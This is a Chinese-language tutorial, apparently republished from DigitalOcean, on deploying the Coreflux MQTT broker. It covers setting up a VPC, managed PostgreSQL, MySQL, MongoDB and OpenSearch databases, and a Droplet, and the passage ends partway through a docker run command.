<p>Coreflux 通过物联网语言编程语言在 DigitalOcean 云平台上提供轻量级 MQTT 代理和数据管道工具，以实现高效的物联网通信。</p>
<h4 data-id="heading-4">什么是 MQTT？</h4>
<p><strong>MQTT</strong>（消息队列遥测传输）是一种轻量级的、发布-订阅网络协议，在物联网生态系统中被广泛采用。专为受限设备和低带宽、高延迟或不稳定的网络设计，MQTT 能够在带宽受限的环境中实现高效、实时的消息传递。</p>
<h4 data-id="heading-5">关于 Coreflux</h4>
<p><strong>Coreflux</strong> 提供了一个轻量级 MQTT 代理，以促进物联网设备与应用程序之间的高效、实时通信，包括每个用例所必需的实时数据转换功能。为可扩展性和可靠性而构建，Coreflux 专为低延迟和高吞吐量至关重要的环境量身定制。</p>
<p>无论你是构建一个小型物联网项目还是部署工业监控系统，Coreflux 都能处理设备之间的消息路由和数据流。</p>
<p>在 DigitalOcean 云平台上使用 Coreflux，你将获得：</p>
<p><strong>数据处理：</strong> 在你的数据所在之处集中处理你的数据处理需求，确保实时数据处理。
<strong>数据集成：</strong> 轻松与其他 DigitalOcean 服务（如托管数据库 PostgreSQL、MongoDB、MySQL 或 OpenSearch）集成，确保为你的所有数据需求提供一个单一且简单的生态系统。
<strong>可扩展性：</strong> 轻松处理不断增长的数据和设备数量，而不会影响性能。
<strong>可靠性：</strong> 确保在所有连接的设备之间进行一致且可靠的消息传递。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5db0241b24574ae790640517055829db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=ervzUK3O1H4umArPsky8IH2g1%2FU%3D" alt="Coreflux MQTT 和托管数据库架构概述" loading="lazy"/></p>
<h3 data-id="heading-6">准备工作</h3>
<p>在开始本 <strong>MQTT 代理</strong> 部署教程之前，你需要：</p>
<ul>
<li>一个 <strong>DigitalOcean</strong> 帐户，可在DigitalOcean.com注册，支持绑定信用卡、支付宝或数字货币</li>
<li>了解 <strong>MQTT</strong> 协议概念和 <strong>物联网</strong> 架构</li>
<li>Visual Studio Code（用于 <strong>LoT Notebook</strong> 扩展）</li>
</ul>
<p><strong>预计时间：</strong> 本教程大约需要 30-45 分钟完成，具体取决于数据库配置时间（通常每个数据库集群需要 1-5 分钟）。</p>
<h3 data-id="heading-7">步骤 1 — 为物联网自动化创建网络基础设施</h3>
<h4 data-id="heading-8">为安全的 MQTT 通信创建 VPC 网络</h4>
<p>首先，你将创建一个<strong>虚拟私有云 (VPC)</strong>，以确保你的 <strong>物联网</strong> 服务和 <strong>MQTT 代理</strong> 之间的安全通信，无需公开访问。</p>
<ol>
<li>登录你的 <strong>DigitalOcean</strong> 控制面板</li>
<li>从左侧导航栏进入 <strong>网络</strong> → <strong>VPC</strong></li>
<li>点击 <strong>创建 VPC 网络</strong></li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69611458bb014e8798adab1df2dce248~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=P3YcDZ39R6LZYqAtATlISO00Hdk%3D" alt="DigitalOcean VPC 创建屏幕" loading="lazy"/></p>
<ol>
<li>为<strong>物联网自动化</strong>配置你的 VPC：
<ul>
<li><strong>名称</strong>：coreflux-integrations-vpc（或你的 VPC 名称）</li>
<li><strong>数据中心区域</strong>：选择法兰克福（或你首选的区域）</li>
<li><strong>IP 范围</strong>：使用默认值或根据需要配置</li>
<li><strong>描述</strong>：为你的 <strong>MQTT 代理和数据库</strong> 网络添加有意义的描述</li>
</ul>
</li>
<li>点击 <strong>创建 VPC 网络</strong></li>
</ol>
<p>VPC 将为你所有的<strong>物联网</strong>资源提供隔离的网络，确保 <strong>Coreflux MQTT 代理</strong> 和 <strong>托管数据库</strong> 之间的安全通信。有关 VPC 配置的更多详细信息，请参阅我们关于创建 VPC 网络的教程。</p>
<h3 data-id="heading-9">步骤 2 — 为可扩展存储设置托管数据库</h3>
<p>根据你的物联网应用需求，选择以下数据库选项之一：</p>
<ul>
<li><strong>PostgreSQL</strong>：适用于需要关系查询、ACID 合规性和复杂关系的结构化数据</li>
<li><strong>MySQL</strong>：适用于结构化工作负载和具有强一致性及广泛工具支持的事务性查询</li>
<li><strong>MongoDB</strong>：适用于具有可变模式的灵活文档存储和快速开发</li>
<li><strong>OpenSearch</strong>：适用于高级搜索、分析、日志分析和时间序列数据可视化</li>
</ul>
<h4 data-id="heading-10">设置 PostgreSQL 托管数据库</h4>
<p>当你的物联网工作负载需要<strong>关系模式</strong>、<strong>强一致性</strong> 和 <strong>高级 SQL 分析</strong>，并由自动备份、监控和维护支持时，DigitalOcean 上的托管 <strong>PostgreSQL</strong> 是一个很好的选择。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d52b17ef79c4144bf06590aa203f240~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=sl%2BwMfpgawP%2BnikmvzOyxkeoUUk%3D" alt="DigitalOcean 托管 PostgreSQL 集群设置" loading="lazy"/></p>
<ol>
<li>从 <strong>DigitalOcean</strong> 控制面板，导航到 <strong>数据库</strong></li>
<li>点击 <strong>创建数据库集群</strong></li>
<li>为<strong>物联网自动化</strong>配置你的 <strong>PostgreSQL</strong> 集群：
<ul>
<li><strong>数据库引擎</strong>：选择 <strong>PostgreSQL</strong></li>
<li><strong>版本</strong>：选择最新的稳定版本</li>
<li><strong>数据中心区域</strong>：选择法兰克福（与你的 VPC 相同）</li>
<li><strong>VPC 网络</strong>：选择你创建的 coreflux-integrations-vpc</li>
<li><strong>数据库集群名称</strong>：postgresql-coreflux-test</li>
<li><strong>项目</strong>：选择你的目标项目</li>
</ul>
</li>
<li>根据你的 <strong>物联网</strong> 需求选择你的计划：
<ol>
<li>对于开发：<strong>基础</strong> 计划，1 GB RAM</li>
<li>对于生产：<strong>通用型</strong> 或更高，用于<strong>可扩展存储</strong></li>
</ol>
</li>
<li>点击 <strong>创建数据库集群</strong></li>
</ol>
<p><strong>托管数据库</strong> 创建过程通常需要 1-5 分钟。完成后，你将被重定向到数据库概览页面，在那里你可以查看连接详细信息并执行管理操作。</p>
<h5 data-id="heading-11">为 MQTT 代理集成配置 PostgreSQL 数据库访问</h5>
<p>系统将提示你进行入门步骤，显示你的连接详细信息，你可以配置入站访问规则（建议限制为你的 IP 和仅 VPC）。</p>
<ol>
<li>点击 <strong>开始使用</strong> 来配置你的 <strong>PostgreSQL</strong> 数据库</li>
<li>（可选操作）限制入站连接：
<ul>
<li>添加你本地计算机的 IP 以进行管理访问</li>
<li><strong>droplet</strong> 将通过 VPC 网络自动获得允许</li>
</ul>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63927d201ea44e39a4d8b237f8560fc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=p3Bl7yeWspLoZUbBm%2F19sIA0Lmw%3D" alt="PostgreSQL 入站访问和 VPC 规则" loading="lazy"/></p>
<p>对于连接详细信息，你将看到两个选项 - 公共网络和 VPC 网络。第一个用于像 DBeaver 这样的工具进行外部访问，而第二个将由 Coreflux 服务用于访问数据库。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d638e87938484d1db87501d4ee217ca4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=x6Vwop%2BIyekCvJmZslKSI4n8RyM%3D" alt="PostgreSQL 公共和 VPC 连接详细信息" loading="lazy"/></p>
<ol>
<li>记下提供的连接详细信息，包括公共访问和 VPC 访问（每种都有不同的详细信息）：
<ul>
<li><strong>主机</strong>：你的数据库主机名</li>
<li><strong>用户</strong>：默认管理员用户</li>
<li><strong>密码</strong>：自动生成的安全密码</li>
<li><strong>数据库</strong>：身份验证数据库名称</li>
</ul>
</li>
</ol>
<h5 data-id="heading-12">测试 PostgreSQL 数据库连接</h5>
<p>你可以使用提供的连接参数，使用公共访问凭证通过 DBeaver 测试 <strong>PostgreSQL</strong> 连接：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d80c80d305aa4b4eb05632325e796e81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=G8Z9frb4YWQzn%2BSs2E7iLZdtdKU%3D" alt="在 DBeaver 中测试 PostgreSQL 连接" loading="lazy"/></p>
<h5 data-id="heading-13">创建 PostgreSQL 应用程序数据库和用户（可选）</h5>
<p>为了更好的安全性和组织性，为你的 <strong>物联网自动化</strong> 应用程序创建一个专用用户和数据库。这也可以通过 DBeaver 或 CLI 完成，但 <strong>DigitalOcean</strong> 提供了一种用户友好的方法：</p>
<ol>
<li>转到你的 <strong>托管数据库</strong> 集群中的 <strong>用户与数据库</strong> 选项卡</li>
<li><strong>创建用户</strong>：
<ul>
<li>用户名：coreflux-broker-client</li>
<li>密码：自动生成</li>
</ul>
</li>
<li><strong>创建数据库</strong>：
<ul>
<li>数据库名称：coreflux-broker-data</li>
</ul>
</li>
</ol>
<p><strong>注意：</strong> 你可能需要更改数据库内的用户权限，以便能够创建表、插入和选择数据。对于 PostgreSQL，使用 GRANT CREATE, INSERT, SELECT ON DATABASE coreflux-broker-data TO coreflux-broker-client; 授予必要的权限。对于 MySQL，使用 GRANT CREATE, INSERT, SELECT ON coreflux-broker-data.* TO 'coreflux-broker-client'@'%';。</p>
<h4 data-id="heading-14">设置 MySQL 托管数据库</h4>
<p>当你想要熟悉的 SQL、广泛的生态系统支持以及处理备份、更新和监控的完全托管服务时，DigitalOcean 上的托管 <strong>MySQL</strong> 是<strong>结构化、事务性物联网数据</strong>的理想选择。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b647f969475d43c38db4019b18cb97e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=USFTGFC%2BKiEZnbn2EM56vyzcCbY%3D" alt="DigitalOcean 托管 MySQL 集群设置" loading="lazy"/></p>
<ol>
<li>从 <strong>DigitalOcean</strong> 控制面板，导航到 <strong>数据库</strong></li>
<li>点击 <strong>创建数据库集群</strong></li>
<li>为<strong>物联网自动化</strong>配置你的 <strong>MySQL</strong> 集群：
<ul>
<li><strong>数据库引擎</strong>：选择 <strong>MySQL</strong></li>
<li><strong>版本</strong>：选择最新的稳定版本</li>
<li><strong>数据中心区域</strong>：选择法兰克福（与你的 VPC 相同）</li>
<li><strong>VPC 网络</strong>：选择你创建的 coreflux-integrations-vpc</li>
<li><strong>数据库集群名称</strong>：mysql-coreflux-test</li>
<li><strong>项目</strong>：选择你的目标项目</li>
</ul>
</li>
<li>根据你的 <strong>物联网</strong> 需求选择你的计划：
<ul>
<li>对于开发：<strong>基础</strong> 计划，1 GB RAM</li>
<li>对于生产：<strong>通用型</strong> 或更高，用于<strong>可扩展存储</strong></li>
</ul>
</li>
<li>点击 <strong>创建数据库集群</strong></li>
</ol>
<p><strong>托管数据库</strong> 创建过程通常需要 1-5 分钟。完成后，你将被重定向到数据库概览页面，在那里你可以查看连接详细信息并执行管理操作。</p>
<h5 data-id="heading-15">为 MQTT 代理集成配置 MySQL 数据库访问</h5>
<p>系统将提示你进行入门步骤，显示你的连接详细信息，你可以配置入站访问规则（建议限制为你的 IP 和仅 VPC）。</p>
<ol>
<li>点击 <strong>开始使用</strong> 来配置你的 <strong>MySQL</strong> 数据库</li>
<li>（可选操作）限制入站连接：
<ul>
<li>添加你本地计算机的 IP 以进行管理访问</li>
<li><strong>droplet</strong> 将通过 VPC 网络自动获得允许</li>
</ul>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc8336f585db4d1ea8dc6f3544cc2085~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=ztWlnMXXjBgreZBOgLm0VJyPO6w%3D" alt="MySQL 入站访问和 VPC 规则" loading="lazy"/></p>
<p>对于连接详细信息，你将看到两个选项 - 公共网络和 VPC 网络。第一个用于像 DBeaver 这样的工具进行外部访问，而第二个将由 Coreflux 服务用于访问数据库。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/27b264819a544da2b826569e314a2d6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=cJ54sD3M88KQ6ibp0m%2BvS4Ztuuw%3D" alt="MySQL 公共和 VPC 连接详细信息" loading="lazy"/></p>
<ol>
<li>记下提供的连接详细信息，包括公共访问和 VPC 访问（每种都有不同的详细信息）：
<ul>
<li><strong>主机</strong>：你的数据库主机名</li>
<li><strong>用户</strong>：默认管理员用户</li>
<li><strong>密码</strong>：自动生成的安全密码</li>
<li><strong>数据库</strong>：身份验证数据库名称</li>
</ul>
</li>
</ol>
<h5 data-id="heading-16">测试 MySQL 数据库连接</h5>
<p>你可以使用提供的连接参数，使用公共访问凭证通过 DBeaver 测试 <strong>MySQL</strong> 连接。</p>
<p><strong>注意：</strong> 你可能需要更改 DBeaver 的驱动程序设置——设置 allowPublicKeyRetrieval = true。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb06e73c35574d1fa009439874695a23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=z17a8NYdozuo0lfH0DXYo0bNOcA%3D" alt="在 DBeaver 中测试 MySQL 连接" loading="lazy"/></p>
<h5 data-id="heading-17">创建 MySQL 应用程序数据库和用户（可选）</h5>
<p>为了更好的安全性和组织性，为你的 <strong>物联网自动化</strong> 应用程序创建一个专用用户和数据库。这也可以通过 DBeaver 或 CLI 完成，但 <strong>DigitalOcean</strong> 提供了一种用户友好的方法：</p>
<ol>
<li>转到你的 <strong>托管数据库</strong> 集群中的 <strong>用户与数据库</strong> 选项卡</li>
<li><strong>创建用户</strong>：
<ul>
<li>用户名：coreflux-broker-client</li>
<li>密码：自动生成</li>
</ul>
</li>
<li><strong>创建数据库</strong>：
<ul>
<li>数据库名称：coreflux-broker-data</li>
</ul>
</li>
</ol>
<h4 data-id="heading-18">设置 MongoDB 托管数据库</h4>
<p>托管 <strong>MongoDB</strong> 非常适合<strong>灵活或不断演变的物联网负载</strong>，让你能够存储异构的传感器文档，而无需严格模式，同时平台处理复制、备份和监控。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/050d0d84095840c28fe0e5ab44c74cb3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=v7QtzvfRXIHpoNa8PdznsuWrWcU%3D" alt="创建托管 MongoDB 集群" loading="lazy"/></p>
<ol>
<li>从 <strong>DigitalOcean</strong> 控制面板，导航到 <strong>数据库</strong></li>
<li>点击 <strong>创建数据库集群</strong></li>
<li>为<strong>物联网自动化</strong>配置你的 <strong>MongoDB</strong> 集群：
<ul>
<li><strong>数据库引擎</strong>：选择 <strong>MongoDB</strong></li>
<li><strong>版本</strong>：选择最新的稳定版本</li>
<li><strong>数据中心区域</strong>：选择法兰克福（与你的 VPC 相同）</li>
<li><strong>VPC 网络</strong>：选择你创建的 coreflux-integrations-vpc</li>
<li><strong>数据库集群名称</strong>：mongodb-coreflux-test</li>
<li><strong>项目</strong>：选择你的目标项目</li>
</ul>
</li>
<li>根据你的 <strong>物联网</strong> 需求选择你的计划：
<ul>
<li>对于开发：<strong>基础</strong> 计划，1 GB RAM</li>
<li>对于生产：<strong>通用型</strong> 或更高，用于<strong>可扩展存储</strong></li>
</ul>
</li>
<li>点击 <strong>创建数据库集群</strong></li>
</ol>
<p><strong>托管数据库</strong> 创建过程通常需要 1-5 分钟。完成后，你将被重定向到数据库概览页面，在那里你可以查看连接详细信息并执行管理操作。</p>
<h5 data-id="heading-19">为 MQTT 代理集成配置 MongoDB 数据库访问</h5>
<p>系统将提示你进行入门步骤，显示你的连接详细信息，你可以配置入站访问规则（建议限制为你的 IP 和仅 VPC）。</p>
<ol>
<li>点击 <strong>开始使用</strong> 来配置你的 <strong>MongoDB</strong> 数据库</li>
<li>（可选）限制入站连接：
<ul>
<li>添加你本地计算机的 IP 以进行管理访问</li>
<li><strong>droplet</strong> 将通过 VPC 网络自动获得允许</li>
</ul>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/164b67dfdfbb4b4091485f5da2a547fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=rKrt6a0R9XizUibtJ%2BCjaH20EI4%3D" alt="为 MQTT 代理集成配置数据库访问" loading="lazy"/></p>
<p>对于连接详细信息，你将看到两个选项：公共网络和 VPC 网络。第一个用于像 MongoDB Compass 这样的工具进行外部访问，而第二个将由 Coreflux 服务用于访问数据库。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a6ab9560f824ff3a2c0901d8b579e8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=ZMb6gHDDXdEfkcmqGXS7id3EIJk%3D" alt="MongoDB 连接详细信息" loading="lazy"/></p>
<ol>
<li>记下提供的连接详细信息，包括公共访问和 VPC 访问（每种都有不同的详细信息）：
<ul>
<li><strong>主机</strong>：你的数据库主机名</li>
<li><strong>用户</strong>：默认管理员用户</li>
<li><strong>密码</strong>：自动生成的安全密码</li>
<li><strong>数据库</strong>：身份验证数据库名称</li>
</ul>
</li>
</ol>
<h5 data-id="heading-20">测试 MongoDB 数据库连接</h5>
<p>你可以使用 MongoDB Compass 或提供的连接字符串，使用公共访问凭证测试 <strong>MongoDB</strong> 连接：</p>
<pre><code class="hljs language-bash" lang="bash">mongodb://username:password@mongodb-host:27017/defaultauthdb?ssl=<span class="hljs-literal">true</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b750b09389574ce4927e33225016f143~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=zNCa1s%2FcILHxOxjk5xWcvAuoK64%3D" alt="测试数据库连接" loading="lazy"/></p>
<h5 data-id="heading-21">创建 MongoDB 应用程序数据库和用户（可选）</h5>
<p>为了更好的安全性和组织性，为你的 <strong>物联网自动化</strong> 应用程序创建一个专用用户和数据库。这也可以通过 MongoDB Compass 或 CLI 完成，但 <strong>DigitalOcean</strong> 提供了一种用户友好的方法：</p>
<ol>
<li>转到你的 <strong>托管数据库</strong> 集群中的 <strong>用户与数据库</strong> 选项卡</li>
<li><strong>创建用户</strong>：
<ul>
<li>用户名：coreflux-broker-client</li>
<li>密码：自动生成</li>
</ul>
</li>
<li><strong>创建数据库</strong>：
<ul>
<li>数据库名称：coreflux-broker-data</li>
</ul>
</li>
</ol>
<h4 data-id="heading-22">设置 OpenSearch 托管数据库</h4>
<p>托管 <strong>OpenSearch</strong> 专为<strong>高容量物联网数据的搜索、日志分析和时间序列仪表板</strong>而设计，该服务为你管理集群健康、扩展和索引存储。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed9dc42426ab4af79c64e9073cc9888a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=HjrvhaIOlCrehRz1eZSYFyTuXPM%3D" alt="创建托管 OpenSearch 集群" loading="lazy"/></p>
<ol>
<li>从 <strong>DigitalOcean</strong> 控制面板，导航到 <strong>数据库</strong></li>
<li>点击 <strong>创建数据库集群</strong></li>
<li>为<strong>物联网自动化</strong>配置你的 <strong>OpenSearch</strong> 集群：
<ul>
<li><strong>数据库引擎</strong>：选择 <strong>OpenSearch</strong></li>
<li><strong>版本</strong>：选择最新的稳定版本</li>
<li><strong>数据中心区域</strong>：选择法兰克福（与你的 VPC 相同）</li>
<li><strong>VPC 网络</strong>：选择你创建的 coreflux-integrations-vpc</li>
<li><strong>数据库集群名称</strong>：opensearch-coreflux-test</li>
<li><strong>项目</strong>：选择你的目标项目</li>
</ul>
</li>
<li>根据你的 <strong>物联网</strong> 需求选择你的计划：
<ol>
<li>对于开发：<strong>基础</strong> 计划，1 GB RAM</li>
<li>对于生产：<strong>通用型</strong> 或更高，用于<strong>可扩展存储</strong></li>
</ol>
</li>
<li>点击 <strong>创建数据库集群</strong></li>
</ol>
<p><strong>托管数据库</strong> 创建过程通常需要 1-5 分钟。完成后，你将被重定向到数据库概览页面，在那里你可以查看连接详细信息并执行管理操作。</p>
<h5 data-id="heading-23">为 MQTT 代理集成配置 OpenSearch 数据库访问</h5>
<p>系统将提示你进行入门步骤，显示你的连接详细信息，你可以配置入站访问规则（建议限制为你的 IP 和仅 VPC）。</p>
<ol>
<li>点击 <strong>开始使用</strong> 来配置你的 OpenSearch 数据库</li>
<li>（可选）限制入站连接：
<ul>
<li>添加你本地计算机的 IP 以进行管理访问</li>
<li>droplet 将通过 VPC 网络自动获得允许</li>
</ul>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4676e2f077745b2b45e9eea92dd4cec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=YbIeE2DbEvWJDIie%2BwWKzDcF87o%3D" alt="配置数据库访问" loading="lazy"/></p>
<p>对于连接详细信息，你将看到两个选项：公共网络和 VPC 网络。第一个用于工具的外部访问，而第二个将由 Coreflux 服务用于访问数据库。你还将看到访问 OpenSearch 仪表板的 URL 和参数。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2526dbd9a7d14c4c960c557450daa903~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=%2B6ckxd9xPuJ4KQN9ZHcU1SxQG34%3D" alt="连接详细信息" loading="lazy"/></p>
<ol>
<li>记下提供的连接详细信息，包括公共访问和 VPC 访问（每种都有不同的详细信息）：
<ul>
<li><strong>主机</strong>：你的数据库主机名</li>
<li><strong>用户</strong>：默认管理员用户</li>
<li><strong>密码</strong>：自动生成的安全密码</li>
<li><strong>数据库</strong>：身份验证数据库名称</li>
</ul>
</li>
</ol>
<h5 data-id="heading-24">测试 OpenSearch 数据库连接</h5>
<p>你可以使用提供的凭证通过 OpenSearch 仪表板测试 OpenSearch 连接：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af7074508fd4445983e9b84b4e7668af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=0VhAIkEohAnS5uBr0%2FB6WJ3qGlY%3D" alt="测试数据库连接" loading="lazy"/></p>
<h3 data-id="heading-25">步骤 3 — 在 DigitalOcean Droplet 上部署 Coreflux MQTT 代理</h3>
<h4 data-id="heading-26">创建 DigitalOcean Droplet</h4>
<ol>
<li>在你的 <strong>DigitalOcean</strong> 控制面板中导航到 <strong>Droplets</strong></li>
<li>点击 <strong>创建 Droplet</strong></li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a3860d6fecc4b929de7667f716492e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=E%2Bi%2BTagmlKL0iSLeEM04okhprcU%3D" alt="创建新的 DigitalOcean Droplet" loading="lazy"/></p>
<ol>
<li>为 <strong>MQTT 代理</strong> 部署配置你的 <strong>droplet</strong>：
<ul>
<li><strong>选择区域</strong>：法兰克福（与你的<strong>托管数据库</strong>相同）</li>
<li><strong>VPC 网络</strong>：选择 coreflux-integrations-vpc</li>
<li><strong>选择镜像</strong>：转到 <strong>Marketplace</strong> 选项卡</li>
<li>搜索 “<strong>Coreflux</strong>” 并从 <strong>Marketplace</strong> 中选择 <strong>Coreflux</strong></li>
</ul>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0cb76d6e11c94169876c79b86e4e2d61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=G5G0i0cu4TcDx57JhScQH9QfZJY%3D" alt="从 Marketplace 选择 Coreflux" loading="lazy"/></p>
<ol>
<li>为你的 <strong>物联网</strong> 工作负载<strong>选择大小</strong>：
<ul>
<li>对于开发：<strong>基础</strong> 计划，2 GB 内存</li>
<li>对于生产：<strong>基础</strong> 或 <strong>通用型</strong> 计划，4+ GB 内存以获得<strong>可扩展</strong>性能</li>
</ul>
</li>
<li><strong>选择身份验证方法</strong>：
<ul>
<li><strong>SSH 密钥</strong>：推荐用于提高安全性
<ol>
<li>可以使用 ssh-keygen 在本地创建密钥</li>
</ol>
</li>
<li><strong>密码</strong>：备选方案</li>
</ul>
</li>
<li><strong>最终确定详细信息</strong>：
<ul>
<li><strong>主机名</strong>：coreflux-test-broker</li>
<li><strong>项目</strong>：选择你的项目</li>
<li><strong>标签</strong>：为 <strong>DevOps</strong> 组织添加相关标签</li>
</ul>
</li>
<li>点击 <strong>创建 Droplet</strong></li>
<li>查看 <strong>Droplet</strong> 主页并等待其完成部署</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60db165fa1894f2f8e17e9c1be546fe9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=xbONZZKU2UnxdqCEgFlGNFkmEjQ%3D" alt="Droplet 部署进行中" loading="lazy"/></p>
<h4 data-id="heading-27">替代方案 - 在Docker镜像Droplet上使用Docker安装Coreflux MQTT代理</h4>
<p>采用与Coreflux Droplet相同的方法，选择Docker作为市场应用镜像。</p>
<p>一旦你的<strong>droplet</strong>运行起来，通过已定义的认证方法或Droplet主页上提供的Web控制台，使用SSH连接到它：</p>
<pre><code class="hljs language-css" lang="css">ssh root<span class="hljs-keyword">@your-droplet-ip</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a791762be35452480fb1a514f3a9ba4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=U5BQcMwgx5%2Bbx9Zj7T36c%2Fn7UO8%3D" alt="SSH连接到Coreflux droplet" loading="lazy"/></p>
<p>使用<strong>Docker</strong>运行<strong>Coreflux MQTT代理</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">docker</span> <span class="hljs-string">run</span> <span class="hljs-string">-d</span> <span class="hljs-string">\</span>
  <span class="hljs-string">--name</span> <span class="hljs-string">coreflux</span> <span class="hljs-string">\</span>
  <span class="hljs-string">-p</span> <span class="hljs-number">1883</span><span class="hljs-string">:1883</span> <span class="hljs-string">\</span>
